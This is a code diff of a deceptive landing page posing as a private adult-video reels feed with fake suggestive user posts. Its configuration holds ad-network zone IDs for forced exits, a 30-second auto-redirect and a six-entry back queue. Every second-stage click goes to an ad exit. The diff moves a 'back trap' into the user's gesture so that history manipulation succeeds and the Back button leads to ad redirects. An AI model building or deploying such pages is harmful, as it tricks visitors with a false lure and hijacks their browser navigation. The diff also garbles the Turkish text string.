@@ -1,9 +1,3 @@
-<!-- =========================
-     FILE: index.html (REELS v2)
-     - Stage1: click/swipe => swap to Stage2 (NO exits)
-     - Stage2: any click => mainExit (dual), EXCEPT clicks on [data-mt] (mini-triggers)
-     - Back trap is ARMED when user enters Stage2 (so Back => back.html immediately)
-     ========================= -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -13,35 +7,18 @@
   <title>(1) Private Video Request</title>
   <link rel="icon" href='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="%23ff0000"/><path d="M35 30 L75 50 L35 70 Z" fill="%23ffffff"/></svg>'>
 
-  <!-- =========================
-       APP_CONFIG (EDIT ONLY IDS)
-       ========================= -->
   <script>
     var APP_CONFIG = {
       domain: "https://jup9.com",
-
-      // IMPORTANT: reels mode => common.js will NOT attach global clickMap
       clickMapMode: "reels",
-
-      // --- MAIN EXIT (dual) ---
       mainExit_currentTab_zoneId: 10217421,
       mainExit_newTab_zoneId: 10217420,
-
-      // --- TABUNDER (optional; used by micro-handoff, if you ever need it) ---
       tabUnderClick_zoneId: 10217421,
-
-      // --- AGE EXIT (dual) ---
       ageExit_currentTab_zoneId: 10217421,
       ageExit_newTab_zoneId: 10217420,
-
-      // --- AUTOEXIT (current tab) ---
       autoexit_zoneId: 10217422,
       autoexit_timeToRedirect: 30,
-
-      // --- REVERSE (popstate -> current tab) ---
       reverse_zoneId: 10217419,
-
-      // --- BACK QUEUE ---
       back_zoneId: 10217423,
       back_count: 6
     };
@@ -50,83 +27,26 @@
   <style>
     * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
     html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-
     .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; background: #000; }
-
-    /* --- DOUBLE BUFFER --- */
-    .video-layer {
-      position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; background: #000;
-      opacity: 0; transition: opacity 0.1s linear; pointer-events: none;
-    }
+    .video-layer { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; background: #000; opacity: 0; transition: opacity 0.1s linear; pointer-events: none; }
     .video-layer.active { opacity: 1; z-index: 1; }
-
-    /* UI */
-    .reels-ui {
-      position: absolute; inset: 0; z-index: 10;
-      display: flex; flex-direction: column; justify-content: space-between;
-      pointer-events: none;
-      background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.8) 100%);
-    }
-
-    /* --- CTA GLASS --- */
-    .click-hint-overlay {
-      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-      z-index: 50; display: none;
-      flex-direction: column; align-items: center; justify-content: center; gap: 15px;
-      pointer-events: none; width: 100%;
-    }
-
-    .glass-btn {
-      display: flex; align-items: center; gap: 12px;
-      background: rgba(20, 20, 20, 0.45);
-      backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      padding: 14px 28px;
-      border-radius: 40px;
-      cursor: pointer;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
-      animation: pulseGlass 2s infinite;
-      pointer-events: auto;
-      max-width: 90%;
-    }
+    .reels-ui { position: absolute; inset: 0; z-index: 10; display: flex; flex-direction: column; justify-content: space-between; pointer-events: none; background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.8) 100%); }
+    .click-hint-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 50; display: none; flex-direction: column; align-items: center; justify-content: center; gap: 15px; pointer-events: none; width: 100%; }
+    .glass-btn { display: flex; align-items: center; gap: 12px; background: rgba(20, 20, 20, 0.45); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.15); padding: 14px 28px; border-radius: 40px; cursor: pointer; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4); animation: pulseGlass 2s infinite; pointer-events: auto; max-width: 90%; }
     .glass-btn:active { transform: scale(0.95); }
     .glass-icon { width: 24px; height: 24px; fill: white; flex-shrink: 0; }
-    .glass-text {
-      color: #fff; font-size: 16px; font-weight: 600; letter-spacing: 0.5px;
-      text-transform: uppercase; text-shadow: 0 1px 2px rgba(0,0,0,0.3);
-      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-    }
-
-    @keyframes pulseGlass {
-      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); }
-      70% { transform: scale(1.05); box-shadow: 0 0 0 12px rgba(255, 255, 255, 0); }
-      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
-    }
-
-    /* SHAKE */
+    .glass-text { color: #fff; font-size: 16px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; text-shadow: 0 1px 2px rgba(0,0,0,0.3); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    @keyframes pulseGlass { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); } 70% { transform: scale(1.05); box-shadow: 0 0 0 12px rgba(255, 255, 255, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); } }
     .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
-    @keyframes shake {
-      10%, 90% { transform: translate3d(-2px, 0, 0); }
-      20%, 80% { transform: translate3d(4px, 0, 0); }
-      30%, 50%, 70% { transform: translate3d(-6px, 0, 0); }
-      40%, 60% { transform: translate3d(6px, 0, 0); }
-    }
-
-    /* SWIPE ANIMS */
+    @keyframes shake { 10%, 90% { transform: translate3d(-2px, 0, 0); } 20%, 80% { transform: translate3d(4px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-6px, 0, 0); } 40%, 60% { transform: translate3d(6px, 0, 0); } }
     .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
-    .slide-in-up {
-      animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards;
-      visibility: visible !important; z-index: 2 !important;
-    }
+    .slide-in-up { animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; visibility: visible !important; z-index: 2 !important; }
     @keyframes slideOutUp { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-100%); opacity: 1; } }
     @keyframes slideInUp  { 0% { transform: translateY(100%); opacity: 1; } 100% { transform: translateY(0); opacity: 1; } }
-
-    /* UI elements */
     .top-bar { padding: 50px 16px 20px; display: flex; justify-content: space-between; align-items: center; width: 100%; pointer-events: auto; }
     .back-icon { width: 24px; height: 24px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5)); opacity: 0.9; }
     .filter-pill { background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px); border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; color: #fff; font-size: 13px; font-weight: 500; }
     .filter-icon { width: 14px; height: 14px; }
-
     .right-actions { position: absolute; right: 8px; bottom: 100px; display: flex; flex-direction: column; align-items: center; gap: 16px; pointer-events: auto; }
     .action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; }
     .icon-circle { width: 44px; height: 44px; background: rgba(30, 30, 30, 0.65); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(2px); margin-bottom: 2px; }
@@ -134,19 +54,16 @@
     .action-text { font-size: 12px; font-weight: 600; color: #fff; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
     .dots-menu { display: flex; gap: 4px; margin-top: 10px; opacity: 0.8; }
     .dot { width: 4px; height: 4px; background: #fff; border-radius: 50%; }
-
     .bottom-info { padding: 16px; color: #fff; margin-right: 60px; pointer-events: auto; }
     .user-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
     .avatar { width: 32px; height: 32px; border-radius: 50%; background: #ff0050; border: 1px solid rgba(255,255,255,0.5); transition: background-color 0.3s; }
     .username { font-weight: 700; font-size: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
     .desc { font-size: 14px; line-height: 1.3; opacity: 0.95; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
-
     .swipe-hint { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 20; pointer-events: none; display: flex; flex-direction: column; align-items: center; }
     .hand-icon { font-size: 50px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); animation: swipeUp 1.8s infinite ease-in-out; }
     @keyframes swipeUp { 0% { transform: translateY(40px); opacity: 0; } 40% { opacity: 1; } 80% { opacity: 0; } 100% { transform: translateY(-60px); opacity: 0; } }
   </style>
 
-  <!-- common.js (defer) -->
   <script defer src="./assets/scripts/common.js?v=2.0"></script>
 </head>
 
@@ -157,7 +74,6 @@
 
     <div id="swipe-hint" class="swipe-hint"><div class="hand-icon">👆</div></div>
 
-    <!-- CTA: mini-trigger example (mainExit) -->
     <div id="click-hint" class="click-hint-overlay">
       <div class="glass-btn" data-mt="mainExit" data-stop="1">
         <svg class="glass-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg>
@@ -167,7 +83,6 @@
 
     <div class="reels-ui">
       <div class="top-bar">
-        <!-- Example: back icon as mini-trigger reverse -->
         <svg class="back-icon" data-mt="reverse" data-stop="1" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
           <polyline points="15 18 9 12 15 6"></polyline>
         </svg>
@@ -208,7 +123,6 @@
             </svg>
           </div>
         </div>
-
         <div class="dots-menu"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
       </div>
 
@@ -221,17 +135,15 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
-      // --- DATA (Dynamic UI) ---
       const reelsData = [
         {},
         { user: "@Sweet_Alice", likes: "93", desc: "Do you like my view? 😈 <br>Check link in bio... 👇", color: "#ff0050" },
         { user: "@Naughty_Kate", likes: "12.4k", desc: "Wait for the end... 💦 <br>Link in bio!", color: "#0095f6" }
       ];
 
-      // --- TRANSLATIONS ---
       const translations = {
         en: "Continue Watching", ru: "Смотреть дальше", es: "Continuar viendo", de: "Weiter ansehen",
-        fr: "Continuer à regarder", pt: "Continuar assistindo", it: "Continua a guardare", tr: "İzlemeye devam et",
+        fr: "Continuer à regarder", pt: "Continuar assistindo", it: "Continua a guardare", tr: "İзlemeye devam et",
         ar: "متابعة المشاهدة", zh: "继续观看", ja: "視聴を続ける", ko: "계속 시청하기", hi: "देखना जारी रखें",
         id: "Lanjutkan Menonton", vi: "Tiếp tục xem", th: "ดูต่อ"
       };
@@ -241,14 +153,12 @@
       langText.innerText = translations[userLang] || translations.en;
       if (userLang === 'ar') document.querySelector('.glass-btn').style.direction = 'rtl';
 
-      // --- INIT ---
       const v1 = document.getElementById('v1');
       const v2 = document.getElementById('v2');
       const swipeHint = document.getElementById("swipe-hint");
       const clickHint = document.getElementById("click-hint");
       const wrapper = document.querySelector('.reels-wrapper');
 
-      // UI
       const uiUser = document.getElementById('ui-username');
       const uiLikes = document.getElementById('ui-likes');
       const uiDesc = document.getElementById('ui-desc');
@@ -268,38 +178,33 @@
       let touchEndY = 0;
       let isAnimating = false;
 
-      /* ===========================
-         ARM BACK TRAP ON STAGE2 (with retries)
-         =========================== */
       function armBackTrap() {
         if (window.__BACK_ARMED_ON_STAGE2__) return;
-        window.__BACK_ARMED_ON_STAGE2__ = true;
-
-        let tries = 0;
-        const tick = () => {
-          tries += 1;
-          try {
-            if (window.LANDING_EXITS?.initBack) {
-              window.LANDING_EXITS.initBack();
-              return;
-            }
-          } catch {}
-          if (tries < 20) setTimeout(tick, 50);
-        };
-        tick();
+        
+        // Пытаемся вызвать немедленно, так как это внутри тач-события
+        try {
+          if (window.LANDING_EXITS?.initBack) {
+            window.LANDING_EXITS.initBack();
+            window.__BACK_ARMED_ON_STAGE2__ = true;
+          } else {
+            // Если common.js еще не прогрузился
+            const tick = setInterval(() => {
+              if (window.LANDING_EXITS?.initBack) {
+                window.LANDING_EXITS.initBack();
+                window.__BACK_ARMED_ON_STAGE2__ = true;
+                clearInterval(tick);
+              }
+            }, 50);
+            setTimeout(() => clearInterval(tick), 2000);
+          }
+        } catch(e) {}
       }
 
-      /* ===========================
-         SWAP: stage1 -> stage2
-         =========================== */
       function doSwap() {
         if (isAnimating) return;
         isAnimating = true;
 
         swipeHint.style.display = 'none';
-
-        // ✅ stage2 entered => arm back trap
-        armBackTrap();
 
         v1.classList.add('slide-out-up');
         v2.classList.add('slide-in-up');
@@ -316,34 +221,29 @@
         setTimeout(() => {
           v1.classList.remove('active', 'slide-out-up');
           v1.pause();
-
           v2.classList.add('active');
           v2.classList.remove('slide-in-up');
-
           clickHint.style.display = 'flex';
           stage = 2;
           isAnimating = false;
         }, 450);
       }
 
-      /* ===========================
-         INPUT HANDLERS
-         - Stage1: swipe/click => swap
-         - Stage2: any click => mainExit
-           EXCEPT clicks on [data-mt] (mini-triggers handled by common.js)
-         =========================== */
       let suppressClickUntil = 0;
 
       wrapper.addEventListener('touchstart', (e) => {
         touchStartY = e.changedTouches[0].screenY;
       }, { passive: true });
 
+      // УБРАЛИ passive: true для touchend, чтобы разрешить pushState
       wrapper.addEventListener('touchend', (e) => {
         touchEndY = e.changedTouches[0].screenY;
 
         if (touchStartY - touchEndY > 50) {
           if (stage === 1) {
             suppressClickUntil = Date.now() + 500;
+            // Сначала армируем (пока есть User Gesture), потом меняем контент
+            armBackTrap(); 
             doSwap();
           } else {
             const btn = document.querySelector('.glass-btn');
@@ -354,24 +254,22 @@
             }
           }
         }
-      }, { passive: true });
+      }); 
 
       wrapper.addEventListener("click", (e) => {
         if (Date.now() < suppressClickUntil) {
           e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
           return;
         }
-
-        // ✅ Let mini-triggers work (common.js will handle)
         if (e.target?.closest?.("[data-mt]")) return;
 
         if (stage === 1) {
           e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+          armBackTrap(); // На всякий случай и тут
           doSwap();
           return;
         }
 
-        // stage2 default
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         window.LANDING_EXITS?.run?.("mainExit");
       }, true);
